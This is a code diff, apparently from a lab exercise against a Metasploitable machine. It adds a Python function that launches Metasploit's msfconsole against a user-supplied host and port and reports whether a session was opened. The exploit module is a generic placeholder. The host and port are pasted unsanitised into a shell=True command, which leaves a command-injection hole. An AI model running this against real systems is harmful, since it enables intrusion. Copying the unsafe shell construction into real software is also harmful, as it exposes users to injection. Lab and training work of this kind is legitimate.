@@ -73,7 +73,32 @@ def attack(host, port):
     This example uses a generic TCP exploit; you'll likely want to
     customize this based on the specific service and version.
     """
+    try:
+        # Construct the Metasploit command (I used a generic TCP exploit as an example)
+        msf_command = f"msfconsole -x 'use exploit/generic/tcp; set RHOSTS {host}; set RPORT {port}; exploit; sessions -l; exit -y'"
+        # Execute the Metasploit command
+        process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+        output = stdout.decode()
+        error = stderr.decode()
+        # Print the output and error messages
+        print("Metasploit Output:")
+        print(output)
+        print("Metasploit Errors:")
+        print(error)
+        # Check if the output contains a specific string indicating a successful attack
+        compromised = False
+        if "Session 1 created" in output: #Check if a session was created. *CHANGE AS NEEDED*
+            compromised = True
+        return compromised
 
+    except FileNotFoundError:
+        print("Metasploit not found. Make sure it's in your PATH.")
+        return False
+    except Exception as e:
+        print(f"Error during Metasploit attack: {e}")
+        return False
+    
 def main():
     metasploitable_ip = input("Enter the IP address of the target machine: ")
 
